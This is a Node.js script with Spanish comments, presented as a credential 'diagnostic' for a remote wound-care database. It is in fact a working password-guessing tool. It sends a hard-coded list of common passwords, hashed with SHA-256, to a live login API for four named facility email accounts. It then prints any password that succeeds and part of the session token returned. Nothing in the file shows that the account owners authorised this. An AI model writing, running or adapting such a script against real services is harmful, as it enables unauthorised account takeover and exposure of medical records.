#!/usr/bin/env node

/**
 * Script de Diagnóstico: Investigar Credenciales Válidas en remoteWoundcareDB
 * 
 * Propósito: Probar diferentes contraseñas y ayudar a encontrar credenciales correctas
 * 
 * Uso:
 * node diagnose-facility-credentials.js
 */

import crypto from 'crypto';
import readline from 'readline';

const colors = {
  reset: '\x1b[0m',
  bright: '\x1b[1m',
  green: '\x1b[32m',
  red: '\x1b[31m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  cyan: '\x1b[36m',
  gray: '\x1b[90m',
};

function log(msg, color = 'reset') {
  console.log(colors[color] + msg + colors.reset);
}

function logSection(title) {
  console.log('\n' + colors.bright + '═'.repeat(70) + colors.reset);
  console.log(colors.bright + title + colors.reset);
  console.log(colors.bright + '═'.repeat(70) + colors.reset);
}

function logSuccess(msg) {
  log('✅ ' + msg, 'green');
}

function logError(msg) {
  log('❌ ' + msg, 'red');
}

function logWarning(msg) {
  log('⚠️  ' + msg, 'yellow');
}

function logInfo(msg) {
  log('ℹ️  ' + msg, 'blue');
}

function logDebug(msg) {
  log('   ' + msg, 'gray');
}

// ============================================================================
// COMMON PASSWORDS TO TEST
// ============================================================================

const COMMON_PASSWORDS = [
  '12345678',
  'password',
  'password123',
  '123456',
  'admin',
  'admin123',
  'Test@123',
  'Facility123',
  'WoundCare123',
  'wounddatacenter',
  'facility',
  'facility123',
  '1234567890',
  'abc123',
  'test',
  'test123',
  '111111',
  '000000',
];

// ============================================================================
// FACILITIES TO DIAGNOSE
// ============================================================================

const FACILITIES_TO_DIAGNOSE = [
  { name: 'Facility 1', email: 'facility1@wounddatacenter.com', id: 1 },
  { name: 'Facility 2', email: 'facility2@wounddatacenter.com', id: 2 },
  { name: 'Facility 4', email: 'facility4@wounddatacenter.com', id: 4 },
  { name: 'Facility 5', email: 'facility5@wounddatacenter.com', id: 5 },
];

const REMOTE_API = 'https://cubed-mr.app/api';

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

function hashPasswordSHA256(password) {
  return crypto.createHash('sha256').update(password).digest('hex');
}

async function testPassword(email, password) {
  const hashedPassword = hashPasswordSHA256(password);
  
  try {
    const payload = {
      entity: 'TryLoginFacilities',
      email: email,
      password: hashedPassword,
      deviceId: `diagnose-${Date.now()}`
    };

    const response = await fetch(`${REMOTE_API}/get`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    const data = await response.json();

    return {
      valid: data.status === true && data.data?.[0]?.status === 1,
      status: data.status,
      statusCode: data.data?.[0]?.status,
      reason: data.data?.[0]?.reason,
      message: data.data?.[0]?.msg,
      facilityName: data.data?.[0]?.name,
      token: data.data?.[0]?.token || null
    };
  } catch (error) {
    return {
      valid: false,
      error: error.message
    };
  }
}

async function bruteForcePassword(facility) {
  logSection(`🔓 PROBANDO CONTRASEÑAS COMUNES PARA: ${facility.name}`);
  
  log(`Email: ${facility.email}`, 'cyan');
  log(`Facility ID: ${facility.id}`, 'cyan');
  log(`\nProbando ${COMMON_PASSWORDS.length} contraseñas comunes...\n`);

  let validPassword = null;
  let attemptCount = 0;

  for (const pwd of COMMON_PASSWORDS) {
    attemptCount++;
    process.stdout.write(`[${attemptCount}/${COMMON_PASSWORDS.length}] Probando: ${pwd.padEnd(20)}`);

    const result = await testPassword(facility.email, pwd);

    if (result.valid) {
      process.stdout.write(' ');
      logSuccess('¡CONTRASEÑA VÁLIDA ENCONTRADA!');
      logDebug(`Contraseña: ${pwd}`);
      logDebug(`Facility: ${result.facilityName}`);
      logDebug(`Token (primeros 50 chars): ${result.token?.substring(0, 50)}...`);
      validPassword = pwd;
      break;
    } else {
      process.stdout.write(' ');
      if (result.error) {
        log('❌ Error de conexión', 'red');
      } else {
        log('❌', 'red');
      }
    }
  }

  if (!validPassword) {
    logWarning(`\nNo se encontró contraseña válida entre las ${COMMON_PASSWORDS.length} probadas`);
    logInfo('Recomendaciones:');
    logDebug('1. Proporcionar lista de contraseñas adicionales');
    logDebug('2. Contactar al administrador de remoteWoundcareDB');
    logDebug('3. Verificar que el usuario existe en la BD remota');
  }

  return validPassword;
}

async function diagnoseSpecificPassword(email, password) {
  logSection('🔍 DIAGNÓSTICO DE CONTRASEÑA ESPECÍFICA');
  
  log(`Email: ${email}`, 'cyan');
  log(`Password: ${'*'.repeat(password.length)}`, 'cyan');
  
  const hashedPassword = hashPasswordSHA256(password);
  log(`\nHash SHA256: ${hashedPassword}`, 'gray');

  log(`\nEnviando petición a: ${REMOTE_API}/get`, 'gray');

  const result = await testPassword(email, password);

  logSection('📊 RESULTADO');

  if (result.valid) {
    logSuccess('¡AUTENTICACIÓN EXITOSA!');
    logDebug(`Facility: ${result.facilityName}`);
    logDebug(`Token: ${result.token?.substring(0, 50)}...`);
    return true;
  } else {
    logError('Autenticación fallida');
    if (result.message) {
      logDebug(`Mensaje: ${result.message}`);
    }
    if (result.reason !== undefined) {
      logDebug(`Código de razón: ${result.reason}`);
    }
    if (result.statusCode !== undefined) {
      logDebug(`Estado: ${result.statusCode}`);
    }
    if (result.error) {
      logDebug(`Error técnico: ${result.error}`);
    }
    return false;
  }
}

async function listFacilities() {
  logSection('📋 FACILITIES DISPONIBLES PARA DIAGNÓSTICO');

  FACILITIES_TO_DIAGNOSE.forEach((f, index) => {
    log(`${index + 1}. ${f.name} (${f.email}) - ID: ${f.id}`, 'cyan');
  });

  return FACILITIES_TO_DIAGNOSE;
}

async function getUserInput(prompt) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  return new Promise(resolve => {
    rl.question(colors.bright + prompt + colors.reset, (answer) => {
      rl.close();
      resolve(answer);
    });
  });
}

// ============================================================================
// INTERACTIVE MENU
// ============================================================================

async function interactiveMenu() {
  console.clear();
  logSection('🔐 DIAGNÓSTICO DE CREDENCIALES - REMOTEWOUNC CAREDB');
  
  log('\nOpciones:', 'bright');
  log('1. Probar contraseñas comunes en todos los facilities', 'cyan');
  log('2. Probar contraseña específica', 'cyan');
  log('3. Ver lista de facilities', 'cyan');
  log('4. Salir', 'gray');

  const choice = await getUserInput('\n¿Cuál es tu opción? (1-4): ');

  switch (choice) {
    case '1':
      // Test common passwords for all facilities
      const results = {};
      for (const facility of FACILITIES_TO_DIAGNOSE) {
        const password = await bruteForcePassword(facility);
        if (password) {
          results[facility.email] = password;
        }
        // Small delay between facilities
        await new Promise(resolve => setTimeout(resolve, 500));
      }

      // Summary
      logSection('📊 RESUMEN DE RESULTADOS');
      const foundCount = Object.keys(results).length;
      if (foundCount > 0) {
        logSuccess(`Se encontraron ${foundCount} contraseña(s) válida(s):`);
        Object.entries(results).forEach(([email, pwd]) => {
          logDebug(`${email} → ${pwd}`);
        });
      } else {
        logWarning('No se encontraron contraseñas válidas');
      }
      break;

    case '2':
      const email = await getUserInput('\nEmail: ');
      const password = await getUserInput('Contraseña: ');
      await diagnoseSpecificPassword(email, password);
      break;

    case '3':
      const facilities = await listFacilities();
      break;

    case '4':
      logInfo('Saliendo...');
      process.exit(0);
      break;

    default:
      logError('Opción no válida');
  }

  // Ask if continue
  const continueChoice = await getUserInput('\n¿Deseas continuar? (s/n): ');
  if (continueChoice.toLowerCase() === 's') {
    await interactiveMenu();
  } else {
    logInfo('Saliendo...');
    process.exit(0);
  }
}

// ============================================================================
// MAIN
// ============================================================================

async function main() {
  await interactiveMenu();
}

main().catch(console.error);
